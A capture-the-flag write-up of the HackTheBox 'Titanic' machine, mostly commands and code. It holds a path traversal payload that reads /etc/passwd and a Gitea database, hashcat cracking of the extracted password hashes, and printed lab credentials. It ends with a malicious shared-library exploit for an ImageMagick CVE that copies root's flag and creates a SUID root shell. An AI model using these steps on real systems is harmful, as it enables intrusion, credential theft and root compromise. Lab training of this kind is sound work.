# Titanic

> ## namp scan

```
nmap -sCV 10.10.11.55
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 08:29 EDT
Nmap scan report for titanic.htb (10.10.11.55)
Host is up (0.37s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/3.0.3 Python/3.10.12
|_http-title: Titanic - Book Your Ship Trip
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.34 seconds
```

<img src="https://github.com/user-attachments/assets/de0fc03e-a91e-445f-a93c-c33b34ed21c2" alt="Funny Monkey GIF" style="display: block; margin: auto;">

open ``/etc/hosts``  put ``titanic.htb    10.10.11.55``

---

> ## book trip find (path traversal)

- > book tirp enter data and intercept the request find that there is file will be download with my data
  >
  > ![image](https://github.com/user-attachments/assets/6bcd04f9-72b3-4ac9-89c7-f37590857171)
  >
  > change ``453e84cf-c86b-4146-9cc8-22edd23e1448.json`` to ``../../../../etc/passwd``
  >
  > ![image](https://github.com/user-attachments/assets/4aa04b04-0350-4d20-afec-fb2a6e1a6490)
  >
  > and it done we have ``/etc/passwod`` file of this server
  >
  > ```
  > root:x:0:0:root:/root:/bin/bash
  > daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  > bin:x:2:2:bin:/bin:/usr/sbin/nologin
  > sys:x:3:3:sys:/dev:/usr/sbin/nologin
  > sync:x:4:65534:sync:/bin:/bin/sync
  > games:x:5:60:games:/usr/games:/usr/sbin/nologin
  > man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  > lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  > mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  > news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  > uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  > proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  > www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  > backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  > list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  > ```
  >

---
  
> ## now find subdomains

```
sudo ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.11.55 -H "Host: FUZZ.titanic.htb" -mc 200
```

![image](https://github.com/user-attachments/assets/acb06067-c505-448a-be46-7a1f2d712d49)

found ``dev`` now open ``dev.titanic.htb`` don't forget to edit ``/etc/hosts`` put ``dev.titanic.htb    10.10.11.55``

![image](https://github.com/user-attachments/assets/a50ad8b2-d069-4034-a927-ff0e23026227)

---

> ## enumerate ``dev.titanic.htb``

click ``explore`` on top left found: 

![image](https://github.com/user-attachments/assets/e1342f0d-0ddd-453a-a10f-9580aec45cac)

![image](https://github.com/user-attachments/assets/6b6df28d-659b-4bc0-924c-16e6559ff866)

when open ``developer/docker-config`` then open ``gitea`` directory found this

```
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```

wooo we found path that we can use in our path traverthatl that we discover ``/home/developer/user.txt``

![image](https://github.com/user-attachments/assets/986cf890-d2ca-4f34-bb93-c4b522ce162e)

and we found the ``user.txt`` flag 😎 now keep nivgate our repos in gtea of developer

found ``mysql`` dir and in it found:

```
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```

damn we found password to ``mysql`` database

but where is this database??

it must be under this path ``/home/developer/gitea/`` 

> search on google ``gitea config data`` found

https://docs.gitea.com/administration/config-cheat-sheet

![image](https://github.com/user-attachments/assets/36e0ac77-df78-4ed4-8127-f07e5249b23e)

found this path ``gitea/conf/app.ini`` now use it in path traversal

![image](https://github.com/user-attachments/assets/98e44e2c-ecd2-47ed-a41a-a992c3190090)

boooom found path for database file ``/data/gitea/gitea.db``

now get this database :

```
curl -X GET "http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db" \
-H "Host: titanic.htb" \
--output gitea.db
```

![image](https://github.com/user-attachments/assets/3e41867e-94fe-4f2f-b5fe-5f9a4a355df5)

---

> ## crack hashes in db file

```
python3 gitea2hashcat.py /home/kali/gitea.db > hashes.txt
```

``wget https://gist.githubusercontent.com/h4rithd/0c5da36a0274904cafb84871cf14e271/raw/f109d178edbe756f15060244d735181278c9b57e/gitea2hashcat.py``

---

### ``cat hashes.txt``

```
sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
sha256:50000:Es/JE20QUDJIL33w/jbEiQ==:XljpYwTwRmlPyxK7uNhJXHy5cViBgtrZAFJ3EZct+tUWjDRIVLaK8QVisiOvRhhOf6M=
```

now crack it using ``hashcat``

```
hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt 
```
now ``show``

```
hashcat -m 10900 hashes.txt --show
```

``found``

```
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

![image](https://github.com/user-attachments/assets/189472a7-0fbf-48ba-b5ef-b5f55e98255c)

> [!warning]
> ### ssh password : **``25282528``**

---

> ## connect using ``ssh``

```
ssh developer@10.10.11.55
```

> ## prvillage esc

after run linpeas found 

![image](https://github.com/user-attachments/assets/97793429-cabf-44ac-8b9a-737ab837dd09)

```bash
ps aux
```

![image](https://github.com/user-attachments/assets/c3dda3e6-89a2-42d0-8df3-907682393fc5)

```bash
/usr/bin/python3 /opt/app/app.py
```

```bash
cd /opt
```

![image](https://github.com/user-attachments/assets/b32380cc-d09e-4e43-8792-d979241253b7)

> ### the script work as ``Root``

```css
-rwxr-xr-x 1 root root 167 Feb  3 17:11 /opt/scripts/identify_images.sh
```

now we will see content of ``identify_images.sh``

```bash
cat identify_images.sh 
```

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

> #### This means that any ``.jpg`` file in this directory will be automatically processed by ``identify`` when the script runs. Given this behavior, I decided to investigate whether ``ImageMagick`` had any known vulnerabilities.

[CVE-2024-41817](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)

on ``/opt/app/static/assets/images`` do :

```bash
nano exploit.c
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    system("cat /root/root.txt > /tmp/root.txt");
    exit(0);
}
```

now do compile to library :

```
gcc -x c -shared -fPIC -o libxcb.so.1 exploit.c
```

copy any image form directoy you in but with new name:

```bash
cp entertainment.jpg exploit.jpg
```

```
ls
```

you must find ``exploit.jpg`` &  ``libxcb.so.1``

![image](https://github.com/user-attachments/assets/8869a38e-ef10-432c-a74d-c13c12c8036f)

now get the ``rootflag`` :

```bash
cat /tmp/root.txt
```

![image](https://github.com/user-attachments/assets/0d2931ca-cbd7-4665-a6c8-50210190c022)

---
---

if you want to be ``root``

```bash
nano exploit.c
```

```c
// exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash");
}
```

do compile to library 

```
gcc -shared -fPIC -o libxcb.so.1 exploit.c
```

create new image to make script start work

```
cp entertainment.jpg exploit2.jpg
```

after script work you will find ``/tmp/rootbash`` with ``suid`` privillage

```
ls -l /tmp/rootbash
```

![image](https://github.com/user-attachments/assets/8b10cb3f-2e9f-407e-ac86-7fb5040fd2eb)

run it :

```
/tmp/rootbash -p
```

![image](https://github.com/user-attachments/assets/b931b127-5b6b-46e1-9f97-ba2bb8cf0a33)

![image](https://github.com/user-attachments/assets/45e41da9-c4d9-4bd9-b397-d0054c3079ca)

<img src="https://media.giphy.com/media/11sBLVxNs7v6WA/giphy.gif" alt="Funny Monkey GIF" style="display: block; margin: auto;">

---
---
---

